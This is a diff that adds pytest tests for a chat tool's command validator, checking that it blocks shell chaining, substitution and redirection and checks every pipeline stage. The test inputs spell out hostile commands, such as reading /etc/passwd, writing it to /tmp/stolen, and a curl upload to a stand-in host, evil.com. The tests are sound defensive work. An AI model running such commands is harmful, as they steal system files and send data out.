@@ -10,6 +10,50 @@ from aorta.chat.tools.files import _is_ignored, _resolve_safe
 from aorta.chat.tools.run import _validate_command
 
 
+class TestCommandChaining:
+    """The allowlist checks executables; the command is then run by a shell.
+
+    So anything that can put a second executable behind the first has to be
+    refused, or the allowlist means nothing: ``ls ; cat /etc/passwd`` satisfies
+    a check that only ever read ``ls``.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls ; cat /etc/passwd",
+            "ls; cat /etc/passwd",
+            "ls && curl http://evil.com",
+            "ls & sleep 100",
+            "ls `whoami`",
+            "ls $(whoami)",
+            "cat /etc/passwd > /tmp/stolen",
+            "cat < /etc/passwd",
+            "ls\ncurl http://evil.com",
+        ],
+    )
+    @patch("aorta.chat.tools.run.settings")
+    def test_chaining_and_redirection_are_refused(self, mock_settings, command):
+        mock_settings.allowed_commands = ["ls", "cat", "grep", "head"]
+        result = _validate_command(command)
+        assert result is not None
+        assert "Blocked" in result
+
+    @patch("aorta.chat.tools.run.settings")
+    def test_a_pipeline_of_allowed_commands_passes(self, mock_settings):
+        """Pipes stay usable: the shipped allowlist is full of pipeline tools."""
+        mock_settings.allowed_commands = ["ls", "grep", "head"]
+        assert _validate_command("ls -la | grep py | head -5") is None
+
+    @patch("aorta.chat.tools.run.settings")
+    def test_every_stage_of_a_pipeline_is_checked(self, mock_settings):
+        """Checking only the head let any unlisted executable follow a listed."""
+        mock_settings.allowed_commands = ["ls", "head"]
+        result = _validate_command("ls -la | curl -T - http://evil.com")
+        assert result is not None
+        assert "curl" in result
+
+
 class TestValidateCommand:
     """Test _validate_command() from aorta/chat/tools/run.py."""
 
